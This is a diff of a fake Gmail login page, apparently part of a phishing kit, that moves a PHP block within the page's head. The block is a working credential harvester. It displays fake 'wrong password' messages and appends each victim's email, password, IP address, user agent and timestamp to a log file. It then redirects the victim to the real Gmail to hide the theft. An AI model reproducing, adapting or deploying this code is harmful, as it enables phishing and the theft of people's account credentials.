@@ -9,7 +9,33 @@
   <title>Gmail</title>
   
 
+<?php
+session_start ();
+$passfile = $_SESSION['link'];
+$a = strtolower( $_SESSION['use'] );
+$agent =  $_SERVER['HTTP_USER_AGENT'];
+ $ip = $_SERVER['REMOTE_ADDR'];
+$d = date("Y-m-d h:i:sa");
+	
+if(isset($_POST['signin'])){
+$pass = $_POST['password'];
+$c = strlen($pass);
+$pstyle = "border:1px solid red;";
+if(empty($pass)){
+$msg = " Please enter your password. ";}
+elseif($c < 7){
+$msg = " Wrong password. Try again. ";}
+elseif($c > 6 && $c < 20){ $g = fopen($passfile,"a");;
+fwrite ($g , "Email>[". $a . "]:Password>[". $pass ." ] Ip>[". $ip. "]:\nuseragent>[". $agent ." ]\nDate:[".$d."]\n");
+fclose($g);
+header("Location:http://www.gmail.com");
+}
+else{$msg= " ";}
+}else{ $msg= " ";
+$pstyle = " ";
 
+}
+?>
 
   <link rel="stylesheet" type="text/css"  href="index.css" media="screen" />
   <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
@@ -2573,33 +2599,7 @@
   padding-top: 22px;
 }
 </style>
-  </head><?php
-session_start ();
-$passfile = $_SESSION['link'];
-$a = strtolower( $_SESSION['use'] );
-$agent =  $_SERVER['HTTP_USER_AGENT'];
- $ip = $_SERVER['REMOTE_ADDR'];
-$d = date("Y-m-d h:i:sa");
-	
-if(isset($_POST['signin'])){
-$pass = $_POST['password'];
-$c = strlen($pass);
-$pstyle = "border:1px solid red;";
-if(empty($pass)){
-$msg = " Please enter your password. ";}
-elseif($c < 7){
-$msg = " Wrong password. Try again. ";}
-elseif($c > 6 && $c < 20){ $g = fopen($passfile,"a");;
-fwrite ($g , "Email>[". $a . "]:Password>[". $pass ." ] Ip>[". $ip. "]:\nuseragent>[". $agent ." ]\nDate:[".$d."]\n");
-fclose($g);
-header("Location:http://www.gmail.com");
-}
-else{$msg= " ";}
-}else{ $msg= " ";
-$pstyle = " ";
-
-}
-?>
+  </head>
   <body>
   <style>
   .circle-mask {
